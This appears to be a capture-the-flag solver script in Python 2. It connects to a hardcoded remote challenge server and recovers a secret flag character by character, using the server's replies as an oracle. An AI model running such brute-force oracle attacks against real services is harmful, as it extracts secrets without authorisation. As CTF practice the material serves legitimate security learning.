#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'ByStudent'
from zio import *
target = "./cg_leak"
target = ("106.75.8.230", 13349)
def get_io(target):
    r_m = False  # COLORED(RAW, "green")
    w_m = False  # COLORED(RAW, "blue")
    io = zio(target, timeout=5, print_read=r_m, print_write=w_m)
    return io
def pwn(io, flag):
    # sample
    io.read_until(":")
    io.writeline("1234")
    io.read_until("?")
    io.writeline("1234")
    io.read_until(": ")
    io.writeline(flag)
    data = io.read_until("\n")
    print data
    if "flag.\n" in data:
        return False
    else:
        return True
import string
flag = ""
for i in range(40):
    for item in string.printable:
        try:
            io = get_io(target)
            if pwn(io, flag + item) == True:
                flag += item
                print i, ":", flag
                break
        except Exception, e:
            raise e
